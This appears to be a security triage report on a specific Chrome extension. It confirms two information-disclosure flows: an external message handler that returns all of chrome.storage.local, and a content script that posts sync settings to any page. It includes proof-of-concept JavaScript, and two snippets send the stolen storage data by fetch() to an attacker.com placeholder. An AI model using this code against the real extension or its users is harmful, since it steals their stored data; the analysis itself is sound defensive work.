# CoCo Analysis: mbglppdnipeddfbnlohekfgedkdoicnn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple flows (2 sendResponseExternal, multiple window_postMessage)

---

## Sink 1-2: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
Lines 48-64 in used_time.txt show flows from storage_local_get to sendResponseExternal:
```
tainted detected!~~~in extension: with sendResponseExternal_sink
from storage_local_get_source to sendResponseExternal_sink
```

The CoCo trace references framework code at lines 751-752 in bg.js, but the actual vulnerability is in the extension code at line 965.

**Code:**

```javascript
// Background script (bg.js) - Line 965 (minified, formatted for readability)
chrome.runtime.onMessageExternal.addListener(function(e, t, n) {
    if ("getLocalStorage" === e.action)
        return chrome.storage.local.get(e.keys, n), // ← Sends storage data back to external caller
        !0
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Malicious webpage on domains whitelisted in externally_connectable:
// - *://*.netflix.com/watch/*
// - *://*.amazon.com/*
// - *://*.hulu.com/*
// - *://*.disneyplus.com/*
// - *://*.youtube.com/*

// Extension ID: mbglppdnipeddfbnlohekfgedkdoicnn
chrome.runtime.sendMessage(
    "mbglppdnipeddfbnlohekfgedkdoicnn",
    {
        action: "getLocalStorage",
        keys: null  // null retrieves ALL storage data
    },
    function(response) {
        console.log("Stolen storage data:", response);
        // Exfiltrate to attacker server
        fetch("https://attacker.com/steal", {
            method: "POST",
            body: JSON.stringify(response)
        });
    }
);

// Alternative: Request specific keys
chrome.runtime.sendMessage(
    "mbglppdnipeddfbnlohekfgedkdoicnn",
    {
        action: "getLocalStorage",
        keys: ["userId", "authToken", "sensitiveData"]
    },
    function(response) {
        console.log("Stolen specific data:", response);
    }
);
```

**Impact:** **Information disclosure vulnerability**. Any webpage on the whitelisted domains (Netflix, Amazon, Hulu, Disney+, YouTube) can request and receive all data stored in `chrome.storage.local` by the extension. The extension stores potentially sensitive user data without any validation or sanitization. The attacker can:
1. Read all stored extension data including user preferences, cached content, and any sensitive information
2. Exfiltrate the data to attacker-controlled servers
3. The extension has `unlimitedStorage` permission, so potentially large amounts of data could be stolen

---

## Sink 3+: storage_sync_get_source → window_postMessage_sink

**CoCo Trace:**
Lines 66+ in used_time.txt show multiple flows from storage_sync_get to window.postMessage:
```
tainted detected!~~~in extension: with window_postMessage_sink
from storage_sync_get_source to window_postMessage_sink
```

The CoCo trace references framework code at lines 394-395 in cs_0.js, but the actual vulnerability is in the extension code at line 473.

**Code:**

```javascript
// Content script (cs_0.js) - Line 473 (minified, formatted for readability)
chrome.storage.sync.get({enableFilters: !0, showConsole: !0}, function(e) {
    window.postMessage({
        action: "loadsettings",
        from: "openangel",
        settings: e  // ← Storage data posted to webpage
    }, "*");
});

// Also triggered on settings change:
chrome.runtime.onMessage.addListener(function(e) {
    // ... other handlers ...
    if ("settingschanged" === e.action)
        chrome.storage.sync.get({enableFilters: !0, showConsole: !0}, function(e) {
            window.postMessage({
                action: "loadsettings",
                from: "openangel",
                settings: e  // ← Storage data posted to webpage
            }, "*");
        })
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage listener on webpage

**Attack:**

```javascript
// Malicious JavaScript on Netflix/Amazon/Hulu/Disney+/YouTube pages
// The content script automatically posts storage data to the page on load

// Listen for the message
window.addEventListener("message", function(event) {
    if (event.data.from === "openangel" && event.data.action === "loadsettings") {
        console.log("Intercepted extension settings:", event.data.settings);
        // Exfiltrate settings data
        fetch("https://attacker.com/steal-settings", {
            method: "POST",
            body: JSON.stringify(event.data.settings)
        });
    }
});

// The content script automatically sends the settings when it loads,
// so the attacker doesn't even need to trigger it - just wait for the message
```

**Impact:** **Information disclosure**. Malicious scripts on whitelisted domains (Netflix, Amazon, Hulu, Disney+, YouTube) can intercept user settings from `chrome.storage.sync` including `enableFilters` and `showConsole` settings. While this specific data may not be highly sensitive, it demonstrates a pattern where storage data is automatically leaked to webpages without any security controls. The attacker can:
1. Passively intercept extension settings as they're automatically posted to the page
2. Learn about user preferences and configuration
3. Use this information to fingerprint users or understand extension behavior

---

## Combined Assessment

Both flows represent **information disclosure vulnerabilities** where storage data is exposed to untrusted contexts:
1. **External message handler** exposes `chrome.storage.local` to whitelisted websites via `chrome.runtime.onMessageExternal`
2. **window.postMessage** exposes `chrome.storage.sync` to webpage JavaScript

These are TRUE POSITIVES because:
- External attackers can trigger both flows (whitelisted websites, per CRITICAL RULE #1)
- Storage data flows back to attacker-accessible outputs (sendResponseExternal, window.postMessage)
- This constitutes sensitive data exfiltration (exploitable impact)
- Extension has all required permissions (storage, externally_connectable)

---
